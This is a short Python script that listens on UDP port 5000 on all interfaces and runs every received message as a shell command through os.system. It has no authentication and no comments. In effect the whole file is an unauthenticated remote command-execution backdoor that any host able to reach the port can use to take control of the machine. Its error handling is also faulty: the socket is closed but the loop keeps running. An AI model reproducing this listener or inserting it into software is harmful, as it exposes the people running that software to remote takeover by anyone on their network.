import socket
import os

udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
udp.bind(('',5000))
print("waiting")
while True:
    try:
        msg,cliente = udp.recvfrom(1024)
        os.system(msg.decode())
    except:
        udp.close()
        print("error!!")
